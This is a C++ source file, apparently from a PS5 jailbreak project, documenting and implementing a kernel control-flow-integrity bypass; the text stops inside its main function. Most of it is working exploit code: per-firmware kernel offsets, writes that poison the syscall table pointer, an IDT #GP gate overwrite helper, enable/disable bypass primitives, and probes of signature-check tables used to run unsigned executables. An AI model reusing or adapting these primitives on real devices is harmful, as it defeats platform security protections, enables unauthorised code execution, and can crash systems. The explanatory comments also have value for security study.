/**
 * cfi_probe.cpp - CFI bypass for PS5 FW 4.03+
 *
 * ==========================================================================
 * HOW THE PS5 KERNEL CFI BYPASS WORKS
 * ==========================================================================
 *
 * LLVM CFI (Control Flow Integrity) instruments every indirect CALL/JMP in
 * the kernel with a type check. On type mismatch, cfi_check_fail() panics.
 *
 * On FW < 3.0:
 *   Byepervisor has a hypervisor exploit. It patches cfi_check_fail() in
 *   kernel .text to RET (0xC3), disabling CFI entirely. It also clears the
 *   XOTEXT bit and sets RW on all .text PTEs via guest page tables, then
 *   triggers suspend/resume to reload the hypervisor NPT state.
 *
 * On FW >= 3.0:
 *   No hypervisor exploit. Kernel .text is execute-only at the NPT level
 *   (AMD-V nested page tables). The guest OS cannot read or write .text.
 *   kernel_copyout on .text addresses faults -- the NPT has no read
 *   permission, only execute. kernel_copyin also faults -- no write.
 *
 *   The CFI bypass uses a completely different approach:
 *
 *   POINTER POISONING + IDT #GP HOOKING
 *
 *   Step 1: Hook the IDT
 *     The IDT (Interrupt Descriptor Table) lives in kernel .data. It is
 *     writable via kernel_copyin. kstuff modifies the #GP entry (vector 13)
 *     to point to its own handler code, which it installs in a kernel data
 *     region with execute permission.
 *
 *   Step 2: Poison sysentvec->sv_table
 *     struct sysentvec {
 *         int      sv_size;     // 0x00 - number of sysent entries
 *         sysent  *sv_table;    // 0x08 - pointer to sysent array
 *         ...
 *     };
 *
 *     sv_table is an 8-byte kernel pointer at offset +8. Its top 16 bits
 *     (bytes 14-15 of the struct) are normally 0xffff (canonical kernel
 *     address in the higher half).
 *
 *     Writing 0xdeb7 to offset +14 makes sv_table = 0xdeb7XXXXXXXXXXXX.
 *     This is a non-canonical address (bits 48-63 != sign extension of bit
 *     47). Any dereference of a non-canonical address raises #GP.
 *
 *   Step 3: Every syscall triggers #GP
 *     The kernel's syscall dispatch (amd64_syscall) reads sv_table to find
 *     the sysent entry for the syscall number:
 *       callp = &sv->sv_table[code];
 *     With the poisoned pointer, this dereference faults with #GP.
 *
 *   Step 4: Custom #GP handler dispatches
 *     The #GP handler (installed in the IDT at step 1) inspects the fault:
 *     - If caused by poisoned-pointer dereference (syscall dispatch), it
 *       performs the syscall dispatch itself, implementing fSELF/fPKG/etc.
 *     - If caused by something else, it chains to the original #GP handler.
 *
 *   Step 5: CFI is never involved
 *     CFI only instruments indirect CALL and JMP instructions in compiled
 *     code. Hardware interrupt/exception dispatch goes through the IDT,
 *     which is a CPU hardware mechanism -- not an indirect call instruction.
 *     The CPU loads the handler address directly from the IDT gate
 *     descriptor. No CFI check occurs.
 *
 * WHY THIS WORKS:
 *   - The IDT is in kernel .data (writable)
 *   - sysentvec is in kernel .data (writable)
 *   - No kernel .text is modified
 *   - No function pointer is replaced with a mistyped target
 *   - The dispatch mechanism is hardware (IDT gate), not software (indirect call)
 *   - CFI has no visibility into hardware interrupt routing
 *
 * PAUSE / RESUME:
 *   Writing 0xffff to sysentvec+14 restores the canonical sv_table pointer.
 *   Normal syscall dispatch resumes. kstuff is "paused". This is needed
 *   when loading shellui or other operations that require normal syscalls.
 *
 *   Writing 0xdeb7 re-enables the bypass.
 *
 * ==========================================================================
 * THIS FILE: Diagnostic probes + standalone bypass primitives
 * ==========================================================================
 *
 * These probes run from userspace with kernel R/W via kernel_copyout/copyin.
 * All reads target .data -- NEVER .text (which would fault).
 *
 * The probes inspect and verify the data structures involved in the bypass:
 *   - IDT entries (especially #GP, vector 13)
 *   - sysentvec structures (the poison target)
 *   - Guest page table permissions (what's executable, writable, XO)
 *   - ctxTable/ctxStatus (data-only fSELF auth bypass)
 *   - sysent table (for kexec installation post-bypass)
 */

extern "C" {
#include <ps5/kernel.h>
int sceKernelMprotect(void *addr, size_t len, int prot);
}

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>

/* ===================================================================
 * Architecture constants
 * =================================================================== */

/* IDT gate descriptor (x86-64), 16 bytes */
struct idt_gate {
    uint16_t offset_lo;     /* 0x00: handler offset bits 0-15 */
    uint16_t selector;      /* 0x02: code segment selector */
    uint8_t  ist;           /* 0x04: IST index (bits 0-2), zero bits 3-7 */
    uint8_t  type_attr;     /* 0x05: type (bits 0-3), S, DPL, P */
    uint16_t offset_mid;    /* 0x06: handler offset bits 16-31 */
    uint32_t offset_hi;     /* 0x08: handler offset bits 32-63 */
    uint32_t reserved;      /* 0x0C: must be zero */
};

/* x86-64 IDTR register layout (10 bytes, returned by SIDT) */
struct idtr {
    uint16_t limit;
    uint64_t base;
} __attribute__((packed));

/* Reconstruct the 64-bit handler address from an IDT gate */
static inline uint64_t idt_gate_handler(const struct idt_gate *g)
{
    return (uint64_t)g->offset_lo
         | ((uint64_t)g->offset_mid << 16)
         | ((uint64_t)g->offset_hi << 32);
}

/* IDT vector numbers */
#define IDT_VECTOR_GP   13  /* #GP - General Protection */
#define IDT_VECTOR_PF   14  /* #PF - Page Fault */
#define IDT_VECTOR_DB    1  /* #DB - Debug (single-step) */

/* Page table entry bits */
#define PTE_PRESENT     (1UL << 0)
#define PTE_RW          (1UL << 1)
#define PTE_USER        (1UL << 2)
#define PTE_PS          (1UL << 7)   /* huge page */
#define PTE_XOTEXT      (1UL << 58)  /* PS5 custom: execute-only */
#define PTE_NX          (1UL << 63)
#define PTE_ADDR_MASK   0x000FFFFFFFFFF000UL

/* Pointer poison value -- makes top 16 bits non-canonical */
#define POISON_TAG      0xdeb7
#define CANONICAL_TAG   0xffff

/* Kernel address ranges (these are architectural, not firmware-specific) */
#define KERNEL_ADDRESS_TEXT_BASE  0xffffffff80000000UL
#ifndef KERNEL_ADDRESS_DATA_BASE
#define KERNEL_ADDRESS_DATA_BASE  0xffffffff83000000UL
#endif

/* ===================================================================
 * Firmware offset table for sysentvec addresses
 *
 * sysentvec = KERNEL_ADDRESS_DATA_BASE + offset
 * The offset differs per firmware.
 * =================================================================== */
struct fw_offsets {
    uint32_t fw_version;    /* e.g. 0x4030000 for 4.03 */
    uint32_t sysentvec;     /* native PS5 sysentvec offset */
    uint32_t sysentvec_ps4; /* PS4 compat sysentvec offset */
};

static const struct fw_offsets g_fw_table[] = {
    /* FW 3.x */
    { 0x3000000,  0xca0cd8, 0xca0e50 },
    { 0x3100000,  0xca0cd8, 0xca0e50 },
    { 0x3200000,  0xca0cd8, 0xca0e50 },
    { 0x3210000,  0xca0cd8, 0xca0e50 },
    /* FW 4.x */
    { 0x4000000,  0xd11bb8, 0xd11d30 },
    { 0x4020000,  0xd11bb8, 0xd11d30 },
    { 0x4030000,  0xd11bb8, 0xd11d30 },
    { 0x4500000,  0xd11bb8, 0xd11d30 },
    { 0x4510000,  0xd11bb8, 0xd11d30 },
    /* FW 5.x */
    { 0x5000000,  0xe00be8, 0xe00d60 },
    { 0x5020000,  0xe00be8, 0xe00d60 },
    { 0x5100000,  0xe00be8, 0xe00d60 },
    { 0x5500000,  0xe00be8, 0xe00d60 },
    /* FW 6.x */
    { 0x6000000,  0xe210a8, 0xe21220 },
    { 0x6020000,  0xe210a8, 0xe21220 },
    { 0x6500000,  0xe210a8, 0xe21220 },
    /* FW 7.x */
    { 0x7000000,  0xe21ab8, 0xe21c30 },
    { 0x7010000,  0xe21ab8, 0xe21c30 },
    { 0x7200000,  0xe21b78, 0xe21cf0 },
    { 0x7400000,  0xe21b78, 0xe21cf0 },
    { 0x7600000,  0xe21b78, 0xe21cf0 },
    { 0x7610000,  0xe21b78, 0xe21cf0 },
    /* FW 8.x */
    { 0x8000000,  0xe21ca8, 0xe21e20 },
    { 0x8200000,  0xe21ca8, 0xe21e20 },
    { 0x8400000,  0xe21ca8, 0xe21e20 },
    { 0x8600000,  0xe21ca8, 0xe21e20 },
    /* FW 9.x */
    { 0x9000000,  0xdba648, 0xdba7c0 },
    { 0x9050000,  0xdba648, 0xdba7c0 },
    { 0x9200000,  0xdba648, 0xdba7c0 },
    { 0x9400000,  0xdba648, 0xdba7c0 },
    { 0x9600000,  0xdba648, 0xdba7c0 },
    /* FW 10.x */
    { 0x10000000, 0xdba6d8, 0xdba850 },
    { 0x10010000, 0xdba6d8, 0xdba850 },
    { 0x10200000, 0xdba6d8, 0xdba850 },
    { 0x10400000, 0xdba6d8, 0xdba850 },
    { 0x10600000, 0xdba6d8, 0xdba850 },
    { 0, 0, 0 } /* sentinel */
};

static const struct fw_offsets *lookup_fw(uint32_t fw)
{
    fw &= 0xffff0000;
    for (int i = 0; g_fw_table[i].fw_version != 0; i++) {
        if (g_fw_table[i].fw_version == fw)
            return &g_fw_table[i];
    }
    return NULL;
}

/* ===================================================================
 * Probe 1: IDT inspection
 *
 * The IDT lives in kernel .data. Read the IDTR (via a kernel data
 * structure or known offset) and dump the #GP entry (vector 13).
 *
 * This tells us:
 *   - Where the current #GP handler points
 *   - Whether kstuff has already hooked it
 *   - The IST (Interrupt Stack Table) index used
 *   - The code segment selector
 *
 * NOTE: We cannot use SIDT from userspace (it returns the user-visible
 * IDTR, not the kernel's). Instead, we find the IDT base from a known
 * kernel data location, or from the per-CPU (pcpu) structure.
 *
 * The pcpu struct contains:
 *   pcpu->pc_common_tss.tss_ist[n] - IST stacks
 *   pcpu->pc_idtr - IDTR value
 *
 * We read pcpu from a known kernel symbol or by walking the GDT.
 * =================================================================== */
int probe_idt_gp_entry(uint64_t idt_base)
{
    if (idt_base == 0) {
        printf("[PROBE1] IDT base not provided, skipping\n");
        printf("[PROBE1] To find IDT base: read pcpu->pc_idtr from kernel .data\n");
        printf("[PROBE1] pcpu is typically at a fixed offset from GS base in kernel\n");
        return -1;
    }

    printf("[PROBE1] IDT base = 0x%lx\n", idt_base);

    /* Read entries for #DB, #GP, #PF */
    int vectors[] = { IDT_VECTOR_DB, IDT_VECTOR_GP, IDT_VECTOR_PF };
    const char *names[] = { "#DB (debug)", "#GP (general protection)", "#PF (page fault)" };

    for (int i = 0; i < 3; i++) {
        struct idt_gate gate;
        uint64_t gate_addr = idt_base + vectors[i] * sizeof(struct idt_gate);

        if (kernel_copyout(gate_addr, &gate, sizeof(gate)) != 0) {
            printf("[PROBE1] Failed to read IDT[%d] at 0x%lx\n", vectors[i], gate_addr);
            continue;
        }

        uint64_t handler = idt_gate_handler(&gate);
        printf("[PROBE1] IDT[%d] %s:\n", vectors[i], names[i]);
        printf("[PROBE1]   handler  = 0x%lx\n", handler);
        printf("[PROBE1]   selector = 0x%x\n", gate.selector);
        printf("[PROBE1]   IST      = %d\n", gate.ist & 0x7);
        printf("[PROBE1]   type     = 0x%x\n", gate.type_attr & 0xF);
        printf("[PROBE1]   DPL      = %d\n", (gate.type_attr >> 5) & 0x3);
        printf("[PROBE1]   present  = %d\n", (gate.type_attr >> 7) & 1);

        /* Check if handler is in .text or .data range */
        if (handler >= KERNEL_ADDRESS_TEXT_BASE && handler < KERNEL_ADDRESS_DATA_BASE)
            printf("[PROBE1]   -> points to kernel .text (stock handler)\n");
        else if (handler >= KERNEL_ADDRESS_DATA_BASE)
            printf("[PROBE1]   -> points to kernel .data (HOOKED by kstuff?)\n");
        else
            printf("[PROBE1]   -> unexpected address range\n");
    }

    return 0;
}

/* ===================================================================
 * Probe 2: sysentvec structure analysis
 *
 * Read the sysentvec structures for both PS5 native and PS4 compat
 * ABIs. Show the sv_table pointer and its current top-16-bit state.
 *
 * sv_table at offset +8 (8 bytes):
 *   Top 16 bits = 0xffff -> canonical, normal dispatch (kstuff paused)
 *   Top 16 bits = 0xdeb7 -> non-canonical, #GP on dereference (kstuff active)
 *
 * Also show sv_size (number of syscalls) for reference.
 * =================================================================== */
int probe_sysentvec(void)
{
    uint32_t fw = kernel_get_fw_version() & 0xffff0000;
    const struct fw_offsets *offsets = lookup_fw(fw);

    if (!offsets) {
        printf("[PROBE2] Unsupported firmware 0x%x\n", fw);
        return -1;
    }

    uint64_t svec     = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec;
    uint64_t svec_ps4 = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec_ps4;

    printf("[PROBE2] Firmware 0x%x\n", fw);
    printf("[PROBE2] sysentvec     @ 0x%lx (offset 0x%x)\n", svec, offsets->sysentvec);
    printf("[PROBE2] sysentvec_ps4 @ 0x%lx (offset 0x%x)\n", svec_ps4, offsets->sysentvec_ps4);

    /* Read both sysentvec structures (first 32 bytes) */
    uint8_t buf[32];
    for (int which = 0; which < 2; which++) {
        uint64_t addr = which ? svec_ps4 : svec;
        const char *label = which ? "PS4" : "PS5";

        if (kernel_copyout(addr, buf, sizeof(buf)) != 0) {
            printf("[PROBE2] Failed to read %s sysentvec\n", label);
            continue;
        }

        int32_t sv_size;
        uint64_t sv_table;
        memcpy(&sv_size, buf + 0, sizeof(sv_size));
        memcpy(&sv_table, buf + 8, sizeof(sv_table));

        uint16_t top_bits = (uint16_t)(sv_table >> 48);

        printf("[PROBE2] %s sysentvec:\n", label);
        printf("[PROBE2]   sv_size    = %d syscalls\n", sv_size);
        printf("[PROBE2]   sv_table   = 0x%lx\n", sv_table);
        printf("[PROBE2]   top 16 bits = 0x%04x", top_bits);

        if (top_bits == POISON_TAG)
            printf(" (POISONED - kstuff ACTIVE)\n");
        else if (top_bits == CANONICAL_TAG)
            printf(" (canonical - kstuff paused or not loaded)\n");
        else
            printf(" (UNKNOWN state 0x%04x)\n", top_bits);

        /* Hex dump for debugging */
        printf("[PROBE2]   raw: ");
        for (int j = 0; j < 24; j++)
            printf("%02x ", buf[j]);
        printf("\n");
    }

    return 0;
}

/* ===================================================================
 * Probe 3: Guest page table permission survey
 *
 * Walk the kernel's GUEST page tables (not NPT) to understand what
 * permissions are set. This reveals:
 *   - .text pages: XOTEXT bit, RW status
 *   - .data pages: RW, NX status
 *   - DMAP pages: permissions for physical memory access
 *
 * NOTE: Guest PTEs are in kernel .data (writable). NPT enforcement
 * is a separate layer we cannot inspect from the guest.
 *
 * The XOTEXT bit (58) is set in guest PTEs for .text pages. Even
 * though the guest PTE allows us to clear it, the NPT still enforces
 * execute-only, so clearing it in the guest PTE alone doesn't help.
 * =================================================================== */
int probe_page_permissions(uint64_t dmpml4i_addr,
                           uint64_t dmpdpi_addr,
                           uint64_t pml4pml4i_addr)
{
    if (dmpml4i_addr == 0) {
        printf("[PROBE3] Page table symbol addresses not provided\n");
        printf("[PROBE3] Need: DMPML4I, DMPDPI, PML4PML4I from kdlsym\n");
        return -1;
    }

    uint32_t DMPML4I = 0, DMPDPI = 0, PML4PML4I = 0;
    kernel_copyout(dmpml4i_addr, &DMPML4I, sizeof(DMPML4I));
    kernel_copyout(dmpdpi_addr, &DMPDPI, sizeof(DMPDPI));
    kernel_copyout(pml4pml4i_addr, &PML4PML4I, sizeof(PML4PML4I));

    uint64_t dmap_base = ((uint64_t)DMPDPI << 30)
                       | ((uint64_t)DMPML4I << 39)
                       | 0xFFFF800000000000UL;
    uint64_t pde_base  = ((uint64_t)PML4PML4I << 39)
                       | ((uint64_t)PML4PML4I << 30)
                       | 0xFFFF800000000000UL;

    printf("[PROBE3] DMPML4I=%u DMPDPI=%u PML4PML4I=%u\n",
           DMPML4I, DMPDPI, PML4PML4I);
    printf("[PROBE3] DMAP base = 0x%lx\n", dmap_base);

    struct {
        const char *name;
        uint64_t va;
    } regions[] = {
        { "kernel .text",   KERNEL_ADDRESS_TEXT_BASE },
        { "kernel .text+2M", KERNEL_ADDRESS_TEXT_BASE + 0x200000 },
        { "kernel .data",   KERNEL_ADDRESS_DATA_BASE },
        { "kernel .data+2M", KERNEL_ADDRESS_DATA_BASE + 0x200000 },
        { "DMAP",           dmap_base + 0x200000 },
    };

    for (int i = 0; i < 5; i++) {
        uint64_t va = regions[i].va;
        uint64_t pde_addr = pde_base + 8 * ((va >> 21) & 0x7FFFFFFUL);
        uint64_t pde;
        kernel_copyout(pde_addr, &pde, sizeof(pde));

        printf("[PROBE3] %s (VA=0x%lx):\n", regions[i].name, va);
        printf("[PROBE3]   guest PDE = 0x%lx\n", pde);
        printf("[PROBE3]   Present=%lu RW=%lu User=%lu PS=%lu NX=%lu XOTEXT=%lu\n",
               (pde >> 0) & 1, (pde >> 1) & 1, (pde >> 2) & 1,
               (pde >> 7) & 1, (pde >> 63) & 1, (pde >> 58) & 1);

        if ((pde >> 58) & 1)
            printf("[PROBE3]   *** XOTEXT set - execute-only in guest PTE ***\n");
        if (!((pde >> 1) & 1))
            printf("[PROBE3]   *** RW=0 - read-only in guest PTE ***\n");
        if (!((pde >> 63) & 1) && ((pde >> 0) & 1))
            printf("[PROBE3]   *** NX=0 - executable in guest PTE ***\n");
    }

    return 0;
}

/* ===================================================================
 * Probe 4: ctxTable / ctxStatus analysis (data-only fSELF/fPKG)
 *
 * The kernel's SBL authentication uses ctxTable[] and ctxStatus[] in
 * kernel .data to track authenticated SELF contexts. By manipulating
 * these tables, we can make the kernel accept fake/modified SELF
 * files without patching any code.
 *
 * This is the "data-only HEN" approach -- it doesn't need code
 * execution at all, just kernel data writes.
 *
 * ctxTable: array of authentication context structures
 * ctxStatus: status flags for each context
 * ctxTable_mtx: mutex protecting the table
 * =================================================================== */
int probe_ctx_tables(uint64_t ctxtable_addr,
                     uint64_t ctxstatus_addr,
                     uint64_t ctxtable_mtx_addr)
{
    if (ctxtable_addr == 0) {
        printf("[PROBE4] ctxTable address not provided\n");
        printf("[PROBE4] Need KERNEL_SYM_CTXTABLE, CTXSTATUS, CTXTABLE_MTX from kdlsym\n");
        return -1;
    }

    printf("[PROBE4] ctxTable     @ 0x%lx\n", ctxtable_addr);
    printf("[PROBE4] ctxStatus    @ 0x%lx\n", ctxstatus_addr);
    printf("[PROBE4] ctxTable_mtx @ 0x%lx\n", ctxtable_mtx_addr);

    /* Read the first few ctxTable entries to understand layout */
    uint8_t ctx_entry[0x80];
    printf("[PROBE4] First 4 ctxTable entries:\n");
    for (int i = 0; i < 4; i++) {
        kernel_copyout(ctxtable_addr + (i * sizeof(ctx_entry)),
                       ctx_entry, sizeof(ctx_entry));

        printf("[PROBE4]   ctx[%d]: ", i);
        for (int j = 0; j < 32; j++)
            printf("%02x ", ctx_entry[j]);
        printf("...\n");
    }

    /* Read ctxStatus entries */
    uint32_t status[4];
    kernel_copyout(ctxstatus_addr, status, sizeof(status));
    printf("[PROBE4] ctxStatus[0..3]: %u %u %u %u\n",
           status[0], status[1], status[2], status[3]);

    return 0;
}

/* ===================================================================
 * Probe 5: Pointer poison test (THE ACTUAL BYPASS)
 *
 * This is what msg.cpp:pause_resume_kstuff() does. It writes 0xdeb7
 * to sysentvec+14 (top 16 bits of sv_table pointer), making sv_table
 * non-canonical. After this, every syscall triggers #GP.
 *
 * PREREQUISITES:
 *   kstuff must already be loaded and have its #GP handler installed
 *   in the IDT. If you poison sv_table WITHOUT a #GP handler ready,
 *   the next syscall will triple-fault and crash the system.
 *
 * This probe:
 *   1. Verifies kstuff is loaded (sceKernelMprotect RWX test)
 *   2. Reads current sysentvec state
 *   3. Poisons if not already poisoned
 *   4. Tests a syscall through the bypass
 *   5. Reports results
 * =================================================================== */
int probe_pointer_poison(void)
{
    uint32_t fw = kernel_get_fw_version() & 0xffff0000;
    const struct fw_offsets *offsets = lookup_fw(fw);

    if (!offsets) {
        printf("[PROBE5] Unsupported firmware 0x%x\n", fw);
        return -1;
    }

    uint64_t svec     = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec;
    uint64_t svec_ps4 = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec_ps4;

    /* Step 1: Check if kstuff is loaded */
    char test_buf[100] = {0};
    int mprotect_result = sceKernelMprotect(test_buf, 100, 0x7); /* RWX */
    if (mprotect_result != 0) {
        printf("[PROBE5] sceKernelMprotect(RWX) failed (%d) -- kstuff NOT loaded\n",
               mprotect_result);
        printf("[PROBE5] CANNOT poison without kstuff #GP handler!\n");
        printf("[PROBE5] Poisoning without a handler = instant triple fault\n");
        return -1;
    }
    printf("[PROBE5] sceKernelMprotect(RWX) succeeded -- kstuff is loaded\n");

    /* Step 2: Read current state */
    uint16_t current_ps5 = 0, current_ps4 = 0;
    kernel_copyout(svec + 14, &current_ps5, sizeof(current_ps5));
    kernel_copyout(svec_ps4 + 14, &current_ps4, sizeof(current_ps4));

    printf("[PROBE5] Current state:\n");
    printf("[PROBE5]   PS5 sysentvec+14 = 0x%04x (%s)\n",
           current_ps5, current_ps5 == POISON_TAG ? "POISONED" : "canonical");
    printf("[PROBE5]   PS4 sysentvec+14 = 0x%04x (%s)\n",
           current_ps4, current_ps4 == POISON_TAG ? "POISONED" : "canonical");

    if (current_ps5 == POISON_TAG) {
        printf("[PROBE5] Already poisoned (kstuff active). Testing syscall...\n");
        pid_t pid = getpid();
        printf("[PROBE5] getpid() through bypass = %d\n", pid);
        printf("[PROBE5] Bypass is operational.\n");
        return 0;
    }

    /* Step 3: Poison */
    printf("[PROBE5] Poisoning sysentvec->sv_table...\n");
    uint16_t poison = POISON_TAG;
    kernel_copyin(&poison, svec + 14, sizeof(poison));
    kernel_copyin(&poison, svec_ps4 + 14, sizeof(poison));

    /* Step 4: Test -- if we get here without crashing, bypass works */
    printf("[PROBE5] Poisoned. Testing syscall through #GP bypass...\n");
    pid_t pid = getpid();
    printf("[PROBE5] getpid() = %d -- bypass is WORKING\n", pid);

    /* Step 5: Verify poison state */
    kernel_copyout(svec + 14, &current_ps5, sizeof(current_ps5));
    printf("[PROBE5] Verified: PS5 sysentvec+14 = 0x%04x\n", current_ps5);

    return 0;
}

/* ===================================================================
 * Probe 6: sysent table analysis (post-bypass)
 *
 * Once the #GP bypass is active, we can also install custom syscalls
 * by modifying the sysent table in kernel .data. This is how kexec
 * works on Byepervisor (sysent[0x11].sy_call = jmp [rsi] gadget).
 *
 * On FW >= 3.0 with kstuff, kexec is not strictly needed because
 * kstuff handles dispatch via the #GP handler. But understanding the
 * sysent layout is useful for diagnostics.
 *
 * struct sysent {
 *     uint32_t n_arg;             // 0x00
 *     uint32_t pad_04h;           // 0x04
 *     uint64_t sy_call;           // 0x08 <- function pointer
 *     uint64_t sy_auevent;        // 0x10
 *     uint64_t sy_systrace_args;  // 0x18
 *     uint32_t sy_entry;          // 0x20
 *     uint32_t sy_return;         // 0x24
 *     uint32_t sy_flags;          // 0x28
 *     uint32_t sy_thrcnt;         // 0x2C
 * }; // 0x30 bytes per entry
 *
 * NOTE: sy_call points into kernel .text. We can read the pointer
 * value (it's stored in .data as part of the sysent table), but we
 * CANNOT read the code at that address.
 * =================================================================== */
#define SYSENT_SIZE  0x30

int probe_sysent(uint64_t sysent_addr)
{
    if (sysent_addr == 0) {
        printf("[PROBE6] sysent address not provided\n");
        printf("[PROBE6] Find via sysentvec->sv_table (offset +8, after unpoison)\n");
        return -1;
    }

    printf("[PROBE6] sysent table @ 0x%lx\n", sysent_addr);

    /* Read a few well-known syscalls */
    struct {
        int num;
        const char *name;
    } syscalls[] = {
        { 0,    "nosys (indirect)" },
        { 1,    "sys_exit" },
        { 3,    "sys_read" },
        { 4,    "sys_write" },
        { 20,   "sys_getpid" },
        { 0x11, "kexec slot" },
    };

    for (int i = 0; i < 6; i++) {
        uint8_t entry[SYSENT_SIZE];
        uint64_t addr = sysent_addr + syscalls[i].num * SYSENT_SIZE;
        kernel_copyout(addr, entry, sizeof(entry));

        uint32_t n_arg;
        uint64_t sy_call;
        memcpy(&n_arg, entry + 0, sizeof(n_arg));
        memcpy(&sy_call, entry + 8, sizeof(sy_call));

        printf("[PROBE6] sysent[%3d] %-24s: n_arg=%u sy_call=0x%lx",
               syscalls[i].num, syscalls[i].name, n_arg, sy_call);

        if (sy_call >= KERNEL_ADDRESS_TEXT_BASE && sy_call < KERNEL_ADDRESS_DATA_BASE)
            printf(" (.text)");
        else if (sy_call >= KERNEL_ADDRESS_DATA_BASE)
            printf(" (.data - custom!)");
        else if (sy_call == 0)
            printf(" (NULL)");
        printf("\n");
    }

    return 0;
}

/* ===================================================================
 * Utility: Poison / unpoise sysentvec
 *
 * These are the primitives that msg.cpp:pause_resume_kstuff() uses.
 * Provided here as standalone functions.
 * =================================================================== */

int cfi_bypass_enable(void)
{
    uint32_t fw = kernel_get_fw_version() & 0xffff0000;
    const struct fw_offsets *offsets = lookup_fw(fw);
    if (!offsets) return -1;

    uint64_t svec     = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec;
    uint64_t svec_ps4 = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec_ps4;
    uint16_t poison = POISON_TAG;

    kernel_copyin(&poison, svec + 14, sizeof(poison));
    kernel_copyin(&poison, svec_ps4 + 14, sizeof(poison));
    return 0;
}

int cfi_bypass_disable(void)
{
    uint32_t fw = kernel_get_fw_version() & 0xffff0000;
    const struct fw_offsets *offsets = lookup_fw(fw);
    if (!offsets) return -1;

    uint64_t svec     = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec;
    uint64_t svec_ps4 = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec_ps4;
    uint16_t canonical = CANONICAL_TAG;

    kernel_copyin(&canonical, svec + 14, sizeof(canonical));
    kernel_copyin(&canonical, svec_ps4 + 14, sizeof(canonical));
    return 0;
}

int cfi_bypass_is_active(void)
{
    uint32_t fw = kernel_get_fw_version() & 0xffff0000;
    const struct fw_offsets *offsets = lookup_fw(fw);
    if (!offsets) return -1;

    uint64_t svec = KERNEL_ADDRESS_DATA_BASE + offsets->sysentvec;
    uint16_t val = 0;
    kernel_copyout(svec + 14, &val, sizeof(val));
    return val == POISON_TAG;
}

/* ===================================================================
 * IDT #GP handler installation (sketch)
 *
 * This is what kstuff does internally. The steps are:
 *
 * 1. Allocate a region in kernel address space:
 *    - Use a kernel data cave (KERNEL_SYM_DATA_CAVE) if available
 *    - Or allocate via kernel malloc and fix up page permissions
 *
 * 2. Write the #GP handler machine code to the allocated region:
 *    - Save all registers
 *    - Check if RIP points to the syscall dispatch code (recognizable
 *      pattern: the instruction that dereferences sv_table)
 *    - If yes: fix up the non-canonical address, perform the dispatch
 *      manually, and IRET back to the caller
 *    - If no: chain to the original #GP handler
 *
 * 3. Make the region executable:
 *    - Modify the guest PTE to clear NX
 *    - The NPT should already allow execution on .data pages (if it
 *      doesn't, you need to find a page that is X in NPT)
 *
 * 4. Read the current IDT #GP entry (vector 13):
 *    - Save the original handler address for chaining
 *
 * 5. Write the new IDT #GP entry:
 *    - Set offset_lo/mid/hi to point to our handler
 *    - Keep the same selector and IST
 *
 * 6. Poison sysentvec->sv_table to activate
 *
 * This is a simplified description. The actual kstuff implementation
 * handles many edge cases (NMI, double fault, IST switching, etc.).
 *
 * The handler code itself is architecture-specific x86-64 assembly.
 * See ps5-kstuff by sleirsgoevy for the complete implementation.
 * =================================================================== */

/* ===================================================================
 * IDT gate write helper
 *
 * Overwrites a single IDT gate entry. Use with extreme care -- a
 * wrong handler address will triple-fault on the next interrupt.
 * =================================================================== */
int idt_write_gate(uint64_t idt_base, int vector, uint64_t handler,
                   uint16_t selector, uint8_t ist, uint8_t type_attr)
{
    struct idt_gate gate;
    gate.offset_lo  = (uint16_t)(handler & 0xFFFF);
    gate.selector   = selector;
    gate.ist        = ist & 0x7;
    gate.type_attr  = type_attr;
    gate.offset_mid = (uint16_t)((handler >> 16) & 0xFFFF);
    gate.offset_hi  = (uint32_t)((handler >> 32) & 0xFFFFFFFF);
    gate.reserved   = 0;

    uint64_t gate_addr = idt_base + vector * sizeof(struct idt_gate);
    return kernel_copyin(&gate, gate_addr, sizeof(gate));
}

/* ===================================================================
 * Main entry point -- run all safe probes
 * =================================================================== */
int cfi_probe_main(uint64_t idt_base,
                   uint64_t dmpml4i_addr,
                   uint64_t dmpdpi_addr,
                   uint64_t pml4pml4i_addr,
                   uint64_t ctxtable_addr,
                   uint64_t ctxstatus_addr,
                   uint64_t ctxtable_mtx_addr,
                   uint64_t sysent_addr)
{
    printf("============================================\n");
    printf(" CFI BYPASS DIAGNOSTICS -- PS5 FW 4.03+\n");
    printf("============================================\n");
    printf("Firmware: 0x%x\n", kernel_get_fw_version());
    printf("\n");

    /* Probe 1: IDT inspection */
    printf("--- Probe 1: IDT #GP Entry ---\n");
    probe_idt_gp_entry(idt_base);
    printf("\n");

    /* Probe 2: sysentvec state */
    printf("--- Probe 2: sysentvec Analysis ---\n");
    probe_sysentvec();
    printf("\n");

    /* Probe 3: Page permissions */
    printf("--- Probe 3: Guest Page Table Permissions ---\n");
    probe_page_permissions(dmpml4i_addr, dmpdpi_addr, pml4pml4i_addr);
    printf("\n");

    /* Probe 4: Auth context tables */
    printf("--- Probe 4: ctxTable / ctxStatus ---\n");
    probe_ctx_tables(ctxtable_addr, ctxstatus_addr, ctxtable_mtx_addr);
    printf("\n");

    /* Probe 5: Pointer poison test */
    printf("--- Probe 5: Pointer Poison (CFI Bypass) ---\n");
    probe_pointer_poison();
    printf("\n");

    /* Probe 6: sysent table */
    printf("--- Probe 6: sysent Table ---\n");
    probe_sysent(sysent_addr);
    printf("\n");

    /* Summary */
    printf("============================================\n");
    printf(" SUMMARY\n");
    printf("============================================\n");

    int active = cfi_bypass_is_active();
    if (active > 0)
        printf("CFI bypass: ACTIVE (pointer poisoned, #GP dispatch)\n");
    else if (active == 0)
        printf("CFI bypass: INACTIVE (sysentvec canonical)\n");
    else
        printf("CFI bypass: UNKNOWN (unsupported firmware)\n");

    printf("\nBypass mechanism: sysentvec->sv_table pointer poisoning\n");
    printf("  Poison value: 0x%04x (non-canonical, triggers #GP)\n", POISON_TAG);
    printf("  Restore value: 0x%04x (canonical, normal dispatch)\n", CANONICAL_TAG);
    printf("  Target offset: sysentvec + 14 (top 16 bits of sv_table ptr)\n");
    printf("  Handler: IDT vector 13 (#GP) -> kstuff dispatch\n");
    printf("  CFI status: BYPASSED (hardware interrupt, not indirect call)\n");

